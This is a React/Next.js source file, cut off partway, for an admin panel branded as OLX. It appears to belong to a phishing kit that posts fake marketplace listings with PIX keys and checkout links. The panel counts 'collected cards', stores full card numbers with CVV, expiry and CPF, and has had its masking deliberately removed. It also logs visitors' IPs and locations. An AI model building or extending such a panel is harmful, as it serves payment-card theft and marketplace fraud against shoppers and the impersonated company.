"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { toast } from "@/components/ui/use-toast"
import { Checkbox } from "@/components/ui/checkbox"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import {
  ArrowLeft,
  CreditCard,
  Copy,
  Pencil,
  Trash2,
  Search,
  Loader2,
  Eye,
  TrendingUp,
  Calendar,
  MousePointer,
  Save,
  Plus,
  BarChart3,
  Users,
  ShoppingBag,
  LogOut,
  Shield,
} from "lucide-react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { getProducts, deleteProduct, updateProduct, type Product } from "@/lib/supabase"
import { getActiveSessions, getDashboardStats, type UserSession } from "@/lib/session-tracker"
import { getAllProductsAnalytics, type ProductAnalytics } from "@/lib/product-analytics"

interface CreditCardType {
  id: string
  cardNumber: string
  expiryDate: string
  cvv: string
  cardholderName: string
  cpfCnpj: string
  addedAt: string
}

export default function AdminDashboard() {
  const router = useRouter()
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [loading, setLoading] = useState(true)
  const [creditCards, setCreditCards] = useState<CreditCardType[]>([])
  const [activeTab, setActiveTab] = useState<
    "overview" | "products" | "analytics" | "cards" | "addresses" | "dashboard"
  >("overview")
  const [addresses, setAddresses] = useState([])
  const [products, setProducts] = useState<Product[]>([])
  const [searchTerm, setSearchTerm] = useState("")
  const [deleteDialogOpen, setDeleteDialogOpen] = useState(false)
  const [editDialogOpen, setEditDialogOpen] = useState(false)
  const [productToDelete, setProductToDelete] = useState<string | null>(null)
  const [productToEdit, setProductToEdit] = useState<Product | null>(null)
  const [imagePreviewUrl, setImagePreviewUrl] = useState<string | null>(null)
  const [imagePreviewOpen, setImagePreviewOpen] = useState(false)
  const [deleting, setDeleting] = useState(false)
  const [saving, setSaving] = useState(false)
  const [analytics, setAnalytics] = useState<Record<string, ProductAnalytics>>({})

  // Estados para seleção múltipla
  const [selectedProducts, setSelectedProducts] = useState<string[]>([])
  const [bulkDeleteDialogOpen, setBulkDeleteDialogOpen] = useState(false)
  const [bulkDeleting, setBulkDeleting] = useState(false)

  const [dashboardStats, setDashboardStats] = useState({
    onlineUsers: 0,
    totalAccesses: 0,
    totalRegistrations: 0,
    totalCards: 0,
    totalProducts: 0,
  })
  const [activeSessions, setActiveSessions] = useState<UserSession[]>([])

  // Estados do formulário de edição
  const [editForm, setEditForm] = useState({
    nome_item: "",
    nome_vendedor: "",
    cpf_vendedor: "",
    valor: "",
    garantia_olx: "",
    valor_frete: "",
    descricao: "",
    categoria: "",
    tipo: "",
    condicao: "",
    cep: "",
    municipio: "",
    publicado_em: "",
    imagem_principal: "",
    imagem_2: "",
    imagem_3: "",
    imagem_4: "",
    chave_pix: "",
    whatsapp: "",
    checkout_url: "",
  })

  // Verificar autenticação
  useEffect(() => {
    const checkAuth = () => {
      const authToken = localStorage.getItem("olx_admin_auth")
      const loginTime = localStorage.getItem("olx_admin_login_time")

      if (!authToken || authToken !== "authenticated") {
        router.push("/admin/login")
        return
      }

      // Verificar se a sessão expirou (24 horas)
      if (loginTime) {
        const loginTimestamp = Number.parseInt(loginTime)
        const now = Date.now()
        const twentyFourHours = 24 * 60 * 60 * 1000

        if (now - loginTimestamp > twentyFourHours) {
          localStorage.removeItem("olx_admin_auth")
          localStorage.removeItem("olx_admin_login_time")
          toast({
            variant: "destructive",
            title: "Sessão expirada",
            description: "Faça login novamente para continuar.",
          })
          router.push("/admin/login")
          return
        }
      }

      setIsAuthenticated(true)
    }

    checkAuth()
  }, [router])

  useEffect(() => {
    if (!isAuthenticated) return

    const loadData = async () => {
      try {
        setLoading(true)

        // Carregar cartões e endereços do localStorage
        const storedCards = localStorage.getItem("creditCards")
        if (storedCards) {
          setCreditCards(JSON.parse(storedCards))
        }

        const storedAddresses = localStorage.getItem("addresses")
        if (storedAddresses) {
          setAddresses(JSON.parse(storedAddresses))
        }

        // Carregar produtos do Supabase
        const productsData = await getProducts()
        setProducts(productsData)

        // Carregar analytics dos produtos
        const analyticsData = await getAllProductsAnalytics()
        setAnalytics(analyticsData)

        // Carregar dados do dashboard
        const loadDashboardData = async () => {
          try {
            const stats = await getDashboardStats()
            setDashboardStats(stats)

            const sessions = await getActiveSessions()
            setActiveSessions(sessions)
          } catch (error) {
            console.error("Erro ao carregar dados do dashboard:", error)
          }
        }

        await loadDashboardData()
      } catch (error) {
        console.error("Erro ao carregar dados:", error)
        toast({
          variant: "destructive",
          title: "Erro ao carregar dados",
          description: "Ocorreu um erro ao carregar os dados do banco.",
        })
      } finally {
        setLoading(false)
      }
    }

    loadData()

    // Atualizar dados a cada 30 segundos
    const interval = setInterval(async () => {
      try {
        const productsData = await getProducts()
        setProducts(productsData)

        const analyticsData = await getAllProductsAnalytics()
        setAnalytics(analyticsData)

        const stats = await getDashboardStats()
        setDashboardStats(stats)

        const sessions = await getActiveSessions()
        setActiveSessions(sessions)
      } catch (error) {
        console.error("Erro ao atualizar dados:", error)
      }
    }, 30000)

    return () => clearInterval(interval)
  }, [isAuthenticated])

  const handleLogout = () => {
    localStorage.removeItem("olx_admin_auth")
    localStorage.removeItem("olx_admin_login_time")
    toast({
      title: "Logout realizado",
      description: "Você foi desconectado com sucesso.",
    })
    router.push("/admin/login")
  }

  // Remove the maskCardNumber function and replace with showFullCardNumber
  const showFullCardNumber = (cardNumber: string) => {
    // Show the full card number with proper spacing
    const cleaned = cardNumber.replace(/\s/g, "")
    if (cleaned.length >= 4) {
      return cleaned.replace(/(.{4})/g, "$1 ").trim()
    }
    return cardNumber
  }

  // Update the formatCPFCNPJ to show full CPF/CNPJ
  const showFullCPFCNPJ = (cpfCnpj: string) => {
    const cleaned = cpfCnpj.replace(/\D/g, "")
    if (cleaned.length === 11) {
      return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    } else if (cleaned.length === 14) {
      return cleaned.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5")
    }
    return cpfCnpj
  }

  const handleCopyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text)
    toast({
      title: "Copiado!",
      description: `${label} copiado para a área de transferência.`,
    })
  }

  const handleDeleteProduct = (id: string) => {
    setProductToDelete(id)
    setDeleteDialogOpen(true)
  }

  const handleEditProduct = (product: Product) => {
    setProductToEdit(product)
    setEditForm({
      nome_item: product.nome_item,
      nome_vendedor: product.nome_vendedor,
      cpf_vendedor: product.cpf_vendedor,
      valor: product.valor,
      garantia_olx: product.garantia_olx,
      valor_frete: product.valor_frete,
      descricao: product.descricao,
      categoria: product.categoria,
      tipo: product.tipo,
      condicao: product.condicao,
      cep: product.cep,
      municipio: product.municipio,
      publicado_em: product.publicado_em,
      imagem_principal: product.imagem_principal,
      imagem_2: product.imagem_2 || "",
      imagem_3: product.imagem_3 || "",
      imagem_4: product.imagem_4 || "",
      chave_pix: product.chave_pix,
      whatsapp: product.whatsapp,
      checkout_url: product.checkout_url || "",
    })
    setEditDialogOpen(true)
  }

  const confirmDeleteProduct = async () => {
    if (!productToDelete) return

    setDeleting(true)
    try {
      await deleteProduct(productToDelete)
      setProducts(products.filter((product) => product.id !== productToDelete))
      setDeleteDialogOpen(false)
      setProductToDelete(null)

      toast({
        title: "Produto excluído",
        description: "O produto foi removido do banco de dados com sucesso.",
      })
    } catch (error) {
      console.error("Erro ao deletar produto:", error)
      toast({
        variant: "destructive",
        title: "Erro ao excluir produto",
        description: "Ocorreu um erro ao excluir o produto. Tente novamente.",
      })
    } finally {
      setDeleting(false)
    }
  }

  // Funções para seleção múltipla
  const handleSelectProduct = (productId: string, checked: boolean) => {
    if (checked) {
      setSelectedProducts([...selectedProducts, productId])
    } else {
      setSelectedProducts(selectedProducts.filter((id) => id !== productId))
    }
  }

  const handleSelectAll = (checked: boolean) => {
    if (checked) {
      setSelectedProducts(filteredProducts.map((p) => p.id))
    } else {
      setSelectedProducts([])
    }
  }

  const handleBulkDelete = () => {
    if (selectedProducts.length === 0) {
      toast({
        variant: "destructive",
        title: "Nenhum produto selecionado",
        description: "Selecione pelo menos um produto para excluir.",
      })
      return
    }
    setBulkDeleteDialogOpen(true)
  }

  const confirmBulkDelete = async () => {
    setBulkDeleting(true)
    try {
      // Deletar produtos selecionados
      const deletePromises = selectedProducts.map((id) => deleteProduct(id))
      await Promise.all(deletePromises)

      // Atualizar lista local
      setProducts(products.filter((product) => !selectedProducts.includes(product.id)))
      setSelectedProducts([])
      setBulkDeleteDialogOpen(false)

      toast({
        title: "Produtos excluídos",
        description: `${selectedProducts.length} produto(s) foram removidos com sucesso.`,
      })
    } catch (error) {
      console.error("Erro ao deletar produtos:", error)
      toast({
        variant: "destructive",
        title: "Erro ao excluir produtos",
        description: "Ocorreu um erro ao excluir alguns produtos. Tente novamente.",
      })
    } finally {
      setBulkDeleting(false)
    }
  }

  const handleSaveEdit = async () => {
    if (!productToEdit) return

    setSaving(true)
    try {
      const updatedProduct = await updateProduct(productToEdit.id, editForm)

      // Atualizar lista local
      setProducts(products.map((p) => (p.id === productToEdit.id ? updatedProduct : p)))

      setEditDialogOpen(false)
      setProductToEdit(null)

      toast({
        title: "Produto atualizado",
        description: "As alterações foram salvas com sucesso.",
      })
    } catch (error) {
      console.error("Erro ao atualizar produto:", error)
      toast({
        variant: "destructive",
        title: "Erro ao atualizar produto",
        description: "Ocorreu um erro ao salvar as alterações. Tente novamente.",
      })
    } finally {
      setSaving(false)
    }
  }

  const handleImagePreview = (url: string) => {
    setImagePreviewUrl(url)
    setImagePreviewOpen(true)
  }

  const filteredProducts = products.filter(
    (product) =>
      product.nome_item.toLowerCase().includes(searchTerm.toLowerCase()) ||
      product.nome_vendedor.toLowerCase().includes(searchTerm.toLowerCase()) ||
      product.categoria.toLowerCase().includes(searchTerm.toLowerCase()) ||
      product.municipio.toLowerCase().includes(searchTerm.toLowerCase()),
  )

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString("pt-BR")
  }

  const getProductAnalytics = (productId: string) => {
    return (
      analytics[productId] || {
        product_id: productId,
        total_clicks: 0,
        clicks_today: 0,
        clicks_this_week: 0,
        clicks_this_month: 0,
        last_clicked: null,
      }
    )
  }

  const totalClicks = Object.values(analytics).reduce((sum, a) => sum + a.total_clicks, 0)
  const clicksToday = Object.values(analytics).reduce((sum, a) => sum + a.clicks_today, 0)

  // Se não estiver autenticado, não renderizar nada (redirecionamento já foi feito)
  if (!isAuthenticated) {
    return null
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white border-b border-gray-200">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <Button
                variant="ghost"
                size="sm"
                onClick={() => router.back()}
                className="flex items-center text-gray-600 hover:text-gray-900"
              >
                <ArrowLeft className="h-4 w-4 mr-2" />
                Voltar
              </Button>
              <div className="flex items-center space-x-2">
                <Shield className="h-6 w-6 text-purple-600" />
                <h1 className="text-2xl font-bold text-gray-900">Admin Dashboard - OLX</h1>
              </div>
            </div>
            <div className="flex items-center space-x-3">
              <Button onClick={() => router.push("/cadastro")} className="bg-[#ff6e00] hover:bg-[#e55a00] text-white">
                <Plus className="h-4 w-4 mr-2" />
                Novo Produto
              </Button>
              <Button variant="outline" onClick={handleLogout} className="text-red-600 border-red-200 hover:bg-red-50">
                <LogOut className="h-4 w-4 mr-2" />
                Sair
              </Button>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-6">
        {/* Navigation Tabs */}
        <div className="mb-8">
          <div className="border-b border-gray-200">
            <nav className="-mb-px flex space-x-8 overflow-x-auto">
              <button
                onClick={() => setActiveTab("overview")}
                className={`py-2 px-1 border-b-2 font-medium text-sm whitespace-nowrap ${
                  activeTab === "overview"
                    ? "border-[#8000ff] text-[#8000ff]"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                <BarChart3 className="h-4 w-4 inline mr-2" />
                Visão Geral
              </button>
              <button
                onClick={() => setActiveTab("products")}
                className={`py-2 px-1 border-b-2 font-medium text-sm whitespace-nowrap ${
                  activeTab === "products"
                    ? "border-[#8000ff] text-[#8000ff]"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                <ShoppingBag className="h-4 w-4 inline mr-2" />
                Produtos ({products.length})
              </button>
              <button
                onClick={() => setActiveTab("analytics")}
                className={`py-2 px-1 border-b-2 font-medium text-sm whitespace-nowrap ${
                  activeTab === "analytics"
                    ? "border-[#8000ff] text-[#8000ff]"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                <TrendingUp className="h-4 w-4 inline mr-2" />
                Analytics
              </button>
              <button
                onClick={() => setActiveTab("dashboard")}
                className={`py-2 px-1 border-b-2 font-medium text-sm whitespace-nowrap ${
                  activeTab === "dashboard"
                    ? "border-[#8000ff] text-[#8000ff]"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                <Users className="h-4 w-4 inline mr-2" />
                Usuários Online
              </button>
              <button
                onClick={() => setActiveTab("cards")}
                className={`py-2 px-1 border-b-2 font-medium text-sm whitespace-nowrap ${
                  activeTab === "cards"
                    ? "border-[#8000ff] text-[#8000ff]"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                <CreditCard className="h-4 w-4 inline mr-2" />
                Cartões
              </button>
              <button
                onClick={() => setActiveTab("addresses")}
                className={`py-2 px-1 border-b-2 font-medium text-sm whitespace-nowrap ${
                  activeTab === "addresses"
                    ? "border-[#8000ff] text-[#8000ff]"
                    : "border-transparent text-gray-500 hover:text-gray-700 hover:border-gray-300"
                }`}
              >
                Endereços
              </button>
            </nav>
          </div>
        </div>

        {/* Loading State */}
        {loading && (
          <div className="flex justify-center items-center py-12">
            <Loader2 className="h-8 w-8 animate-spin text-gray-400" />
            <span className="ml-2 text-gray-600">Carregando dados do banco...</span>
          </div>
        )}

        {/* Overview Tab */}
        {!loading && activeTab === "overview" && (
          <div className="space-y-6">
            {/* Stats Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-6">
              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Total de Produtos</CardTitle>
                  <ShoppingBag className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">{products.length}</div>
                  <p className="text-xs text-muted-foreground">Produtos cadastrados</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Total de Cliques</CardTitle>
                  <MousePointer className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">{totalClicks}</div>
                  <p className="text-xs text-muted-foreground">Cliques em produtos</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Cliques Hoje</CardTitle>
                  <Calendar className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-green-600">{clicksToday}</div>
                  <p className="text-xs text-muted-foreground">Cliques nas últimas 24h</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Usuários Online</CardTitle>
                  <div className="h-4 w-4 bg-green-500 rounded-full animate-pulse"></div>
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-green-600">{dashboardStats.onlineUsers}</div>
                  <p className="text-xs text-muted-foreground">Ativos agora</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Cartões Coletados</CardTitle>
                  <CreditCard className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">{creditCards.length}</div>
                  <p className="text-xs text-muted-foreground">Cartões salvos</p>
                </CardContent>
              </Card>
            </div>

            {/* Recent Activity */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle>Produtos Mais Clicados</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {products
                      .map((product) => ({
                        ...product,
                        analytics: getProductAnalytics(product.id),
                      }))
                      .sort((a, b) => b.analytics.total_clicks - a.analytics.total_clicks)
                      .slice(0, 5)
                      .map((product) => (
                        <div key={product.id} className="flex items-center space-x-4">
                          <div className="w-10 h-10 relative overflow-hidden rounded">
                            <Image
                              src={product.imagem_principal || "/placeholder.svg?height=40&width=40&text=Sem+Imagem"}
                              alt={product.nome_item}
                              width={40}
                              height={40}
                              className="object-cover"
                            />
                          </div>
                          <div className="flex-1">
                            <p className="text-sm font-medium line-clamp-1">{product.nome_item}</p>
                            <p className="text-xs text-gray-500">{product.valor}</p>
                          </div>
                          <div className="text-right">
                            <div className="text-sm font-bold">{product.analytics.total_clicks}</div>
                            <div className="text-xs text-gray-500">cliques</div>
                          </div>
                        </div>
                      ))}
                  </div>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle>Atividade Recente</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {products.slice(0, 5).map((product) => (
                      <div key={product.id} className="flex items-center space-x-4">
                        <div className="w-10 h-10 bg-[#8000ff] rounded-full flex items-center justify-center">
                          <ShoppingBag className="h-5 w-5 text-white" />
                        </div>
                        <div className="flex-1">
                          <p className="text-sm font-medium">Novo produto: {product.nome_item}</p>
                          <p className="text-xs text-gray-500">
                            {product.valor} • {formatDate(product.created_at)}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {/* Products Tab */}
        {!loading && activeTab === "products" && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                  <CardTitle className="flex items-center gap-2">
                    <ShoppingBag className="h-5 w-5" />
                    Gerenciar Produtos
                  </CardTitle>
                  <div className="flex items-center gap-3">
                    {selectedProducts.length > 0 && (
                      <Button variant="destructive" onClick={handleBulkDelete} className="bg-red-600 hover:bg-red-700">
                        <Trash2 className="h-4 w-4 mr-2" />
                        Excluir Selecionados ({selectedProducts.length})
                      </Button>
                    )}
                    <div className="relative w-full sm:w-64">
                      <Search className="absolute left-2 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                      <Input
                        placeholder="Buscar produtos..."
                        value={searchTerm}
                        onChange={(e) => setSearchTerm(e.target.value)}
                        className="pl-8"
                      />
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                {filteredProducts.length > 0 ? (
                  <div className="overflow-x-auto">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr className="border-b border-gray-200">
                          <th className="text-left py-3 px-4 font-medium text-gray-900">
                            <Checkbox
                              checked={
                                selectedProducts.length === filteredProducts.length && filteredProducts.length > 0
                              }
                              onCheckedChange={handleSelectAll}
                            />
                          </th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Produto</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Vendedor</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Valor</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Categoria</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Cliques</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Criado em</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Ações</th>
                        </tr>
                      </thead>
                      <tbody>
                        {filteredProducts.map((product, index) => {
                          const productAnalytics = getProductAnalytics(product.id)
                          const isSelected = selectedProducts.includes(product.id)
                          return (
                            <tr key={product.id} className={index % 2 === 0 ? "bg-gray-50" : "bg-white"}>
                              <td className="py-3 px-4">
                                <Checkbox
                                  checked={isSelected}
                                  onCheckedChange={(checked) => handleSelectProduct(product.id, checked as boolean)}
                                />
                              </td>
                              <td className="py-3 px-4">
                                <div className="flex items-center space-x-3">
                                  <div className="w-12 h-12 relative overflow-hidden rounded">
                                    <Image
                                      src={
                                        product.imagem_principal ||
                                        "/placeholder.svg?height=48&width=48&text=Sem+Imagem" ||
                                        "/placeholder.svg" ||
                                        "/placeholder.svg"
                                      }
                                      alt={product.nome_item}
                                      width={48}
                                      height={48}
                                      className="object-cover"
                                    />
                                  </div>
                                  <div>
                                    <div className="text-sm font-medium text-gray-900 line-clamp-1">
                                      {product.nome_item}
                                    </div>
                                    <div className="text-xs text-gray-500">{product.municipio}</div>
                                  </div>
                                </div>
                              </td>
                              <td className="py-3 px-4 text-sm text-gray-900">{product.nome_vendedor}</td>
                              <td className="py-3 px-4 text-sm font-medium text-gray-900">{product.valor}</td>
                              <td className="py-3 px-4 text-sm text-gray-900">{product.categoria}</td>
                              <td className="py-3 px-4">
                                <div className="text-sm font-medium text-gray-900">{productAnalytics.total_clicks}</div>
                                <div className="text-xs text-gray-500">{productAnalytics.clicks_today} hoje</div>
                              </td>
                              <td className="py-3 px-4 text-sm text-gray-500">{formatDate(product.created_at)}</td>
                              <td className="py-3 px-4">
                                <div className="flex items-center space-x-2">
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    onClick={() => handleImagePreview(product.imagem_principal)}
                                    className="text-blue-600 hover:text-blue-800"
                                  >
                                    <Eye className="h-4 w-4" />
                                  </Button>
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    onClick={() => handleEditProduct(product)}
                                    className="text-amber-600 hover:text-amber-800"
                                  >
                                    <Pencil className="h-4 w-4" />
                                  </Button>
                                  <Button
                                    variant="ghost"
                                    size="sm"
                                    onClick={() => handleDeleteProduct(product.id)}
                                    className="text-red-600 hover:text-red-800"
                                  >
                                    <Trash2 className="h-4 w-4" />
                                  </Button>
                                </div>
                              </td>
                            </tr>
                          )
                        })}
                      </tbody>
                    </table>
                  </div>
                ) : (
                  <div className="text-center py-12">
                    <ShoppingBag className="h-12 w-12 text-gray-400 mx-auto mb-4" />
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Nenhum produto encontrado</h3>
                    <p className="text-gray-500">
                      {searchTerm ? "Tente ajustar sua busca." : "Os produtos cadastrados aparecerão aqui."}
                    </p>
                    <Button
                      onClick={() => router.push("/cadastro")}
                      className="mt-4 bg-[#ff6e00] hover:bg-[#e55a00] text-white"
                    >
                      <Plus className="h-4 w-4 mr-2" />
                      Cadastrar Novo Produto
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>
          </div>
        )}

        {/* Analytics Tab */}
        {!loading && activeTab === "analytics" && (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Total de Cliques</CardTitle>
                  <MousePointer className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">{totalClicks}</div>
                  <p className="text-xs text-muted-foreground">Todos os produtos</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Cliques Hoje</CardTitle>
                  <Calendar className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-green-600">{clicksToday}</div>
                  <p className="text-xs text-muted-foreground">Últimas 24 horas</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Média por Produto</CardTitle>
                  <TrendingUp className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">
                    {products.length > 0 ? Math.round(totalClicks / products.length) : 0}
                  </div>
                  <p className="text-xs text-muted-foreground">Cliques por produto</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Produtos com Cliques</CardTitle>
                  <BarChart3 className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">
                    {Object.values(analytics).filter((a) => a.total_clicks > 0).length}
                  </div>
                  <p className="text-xs text-muted-foreground">De {products.length} produtos</p>
                </CardContent>
              </Card>
            </div>

            <Card>
              <CardHeader>
                <CardTitle>Ranking de Produtos por Cliques</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="border-b border-gray-200">
                        <th className="text-left py-3 px-4 font-medium text-gray-900">Posição</th>
                        <th className="text-left py-3 px-4 font-medium text-gray-900">Produto</th>
                        <th className="text-left py-3 px-4 font-medium text-gray-900">Total</th>
                        <th className="text-left py-3 px-4 font-medium text-gray-900">Hoje</th>
                        <th className="text-left py-3 px-4 font-medium text-gray-900">Esta Semana</th>
                        <th className="text-left py-3 px-4 font-medium text-gray-900">Este Mês</th>
                        <th className="text-left py-3 px-4 font-medium text-gray-900">Último Clique</th>
                      </tr>
                    </thead>
                    <tbody>
                      {products
                        .map((product) => ({
                          ...product,
                          analytics: getProductAnalytics(product.id),
                        }))
                        .sort((a, b) => b.analytics.total_clicks - a.analytics.total_clicks)
                        .map((product, index) => (
                          <tr key={product.id} className={index % 2 === 0 ? "bg-gray-50" : "bg-white"}>
                            <td className="py-3 px-4">
                              <div className="flex items-center">
                                <span className="text-sm font-bold text-gray-900">#{index + 1}</span>
                                {index === 0 && <span className="ml-2 text-yellow-500">🥇</span>}
                                {index === 1 && <span className="ml-2 text-gray-400">🥈</span>}
                                {index === 2 && <span className="ml-2 text-orange-600">🥉</span>}
                              </div>
                            </td>
                            <td className="py-3 px-4">
                              <div className="flex items-center space-x-3">
                                <div className="w-10 h-10 relative overflow-hidden rounded">
                                  <Image
                                    src={
                                      product.imagem_principal || "/placeholder.svg?height=40&width=40&text=Sem+Imagem"
                                    }
                                    alt={product.nome_item}
                                    width={40}
                                    height={40}
                                    className="object-cover"
                                  />
                                </div>
                                <div>
                                  <div className="text-sm font-medium text-gray-900 line-clamp-1">
                                    {product.nome_item}
                                  </div>
                                  <div className="text-xs text-gray-500">{product.valor}</div>
                                </div>
                              </div>
                            </td>
                            <td className="py-3 px-4">
                              <span className="text-sm font-bold text-gray-900">{product.analytics.total_clicks}</span>
                            </td>
                            <td className="py-3 px-4">
                              <span className="text-sm text-green-600">{product.analytics.clicks_today}</span>
                            </td>
                            <td className="py-3 px-4">
                              <span className="text-sm text-blue-600">{product.analytics.clicks_this_week}</span>
                            </td>
                            <td className="py-3 px-4">
                              <span className="text-sm text-purple-600">{product.analytics.clicks_this_month}</span>
                            </td>
                            <td className="py-3 px-4 text-sm text-gray-500">
                              {product.analytics.last_clicked ? formatDate(product.analytics.last_clicked) : "Nunca"}
                            </td>
                          </tr>
                        ))}
                    </tbody>
                  </table>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Dashboard Tab */}
        {!loading && activeTab === "dashboard" && (
          <div className="space-y-6">
            <Card>
              <CardHeader>
                <div className="flex items-center justify-between">
                  <CardTitle className="flex items-center gap-2">
                    <div className="h-3 w-3 bg-green-500 rounded-full animate-pulse"></div>
                    Usuários Online Agora
                  </CardTitle>
                  <div className="text-sm text-gray-500">Atualizado a cada 10 segundos</div>
                </div>
              </CardHeader>
              <CardContent>
                {activeSessions.length > 0 ? (
                  <div className="overflow-x-auto">
                    <table className="w-full border-collapse">
                      <thead>
                        <tr className="border-b border-gray-200">
                          <th className="text-left py-3 px-4 font-medium text-gray-900">ID de Sessão</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Data/Hora Entrada</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Dispositivo</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Localização</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Página Atual</th>
                          <th className="text-left py-3 px-4 font-medium text-gray-900">Status</th>
                        </tr>
                      </thead>
                      <tbody>
                        {activeSessions.map((session, index) => {
                          const isOnline = new Date(session.last_activity) > new Date(Date.now() - 3 * 60 * 1000)
                          const deviceInfo = session.user_agent?.includes("Mobile")
                            ? "📱 Mobile"
                            : session.user_agent?.includes("iPhone")
                              ? "📱 iPhone"
                              : session.user_agent?.includes("Android")
                                ? "📱 Android"
                                : "💻 Desktop"

                          return (
                            <tr key={session.id} className={index % 2 === 0 ? "bg-gray-50" : "bg-white"}>
                              <td className="py-3 px-4 text-sm font-mono text-gray-900">
                                {session.session_id.substring(0, 16)}...
                              </td>
                              <td className="py-3 px-4 text-sm text-gray-900">{formatDate(session.first_visit)}</td>
                              <td className="py-3 px-4 text-sm text-gray-900">
                                <div className="flex items-center gap-2">
                                  <span>{deviceInfo}</span>
                                </div>
                              </td>
                              <td className="py-3 px-4 text-sm text-gray-900">
                                <div>
                                  <div className="font-mono">{session.ip_address}</div>
                                  {session.city && (
                                    <div className="text-xs text-gray-500">
                                      📍 {session.city}, {session.country}
                                    </div>
                                  )}
                                </div>
                              </td>
                              <td className="py-3 px-4 text-sm text-gray-900">
                                <div className="truncate max-w-[200px]">{session.current_page || "/"}</div>
